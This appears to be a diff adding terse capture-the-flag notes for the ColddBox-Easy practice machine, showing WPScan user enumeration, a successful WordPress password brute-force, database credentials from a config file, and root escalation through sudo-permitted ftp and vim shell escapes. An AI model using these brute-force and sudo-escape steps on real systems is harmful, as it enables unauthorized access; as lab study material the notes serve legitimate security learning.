@@ -1,0 +1,90 @@
+WPSCAN:
+
+[i] User(s) Identified:
+
+[+] the cold in person
+ | Found By: Rss Generator (Passive Detection)
+
+[+] philip
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] c0ldd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] hugo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 4 user/s
+[SUCCESS] - c0ldd / 9876543210                                                                                                                                                                                                             
+^Cying hugo / silverado Time: 00:08:21 <                                                                                                                                                         > (28859 / 57378792)  0.05%  ETA: ??:??:??
+[!] Valid Combinations Found:
+ | Username: c0ldd, Password: 9876543210
+
+
+
+philip
+c0ldd:9876543210
+hugo
+
+
+Reverse shell.php
+
+...LinPEAS.sh
+
+define('DB_NAME', 'colddbox');
+
+/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'cybersecurity');
+
+
+
+c0ldd@ColddBox-Easy:~$ sudo -l
+[sudo] password for c0ldd: 
+Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+    (root) /usr/bin/vim
+    (root) /bin/chmod
+    (root) /usr/bin/ftp
+c0ldd@ColddBox-Easy:~$ 
+c0ldd@ColddBox-Easy:~$ 
+c0ldd@ColddBox-Easy:~$ cat user.txt 
+RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
+c0ldd@ColddBox-Easy:~$ ls -la
+total 28
+drwxr-xr-x 3 c0ldd c0ldd 4096 oct 19 18:51 .
+drwxr-xr-x 3 root  root  4096 sep 24 16:52 ..
+-rw------- 1 c0ldd c0ldd    8 nov  8 12:00 .bash_history
+-rw-r--r-- 1 c0ldd c0ldd  220 sep 24 16:52 .bash_logout
+-rw-r--r-- 1 c0ldd c0ldd    0 oct 14 13:28 .bashrc
+drwx------ 2 c0ldd c0ldd 4096 sep 24 16:53 .cache
+-rw-r--r-- 1 c0ldd c0ldd  655 sep 24 16:52 .profile
+-rw-r--r-- 1 c0ldd c0ldd    0 sep 24 16:53 .sudo_as_admin_successful
+-rwxrwxrwx 1 c0ldd c0ldd   53 sep 24 18:22 user.txt
+c0ldd@ColddBox-Easy:~$ ./user.txt 
+c0ldd@ColddBox-Easy:~$ sudo /usr/bin/ftp
+ftp> !/bin/sh
+# id
+uid=0(root) gid=0(root) grupos=0(root)
+# cd /root
+# ls
+root.txt
+# cat root.txt  
+wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
+# exit
+ftp> q
+?Ambiguous command
+ftp> bye
+c0ldd@ColddBox-Easy:~$ sudo /usr/bin/vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) grupos=0(root)
+# 
+
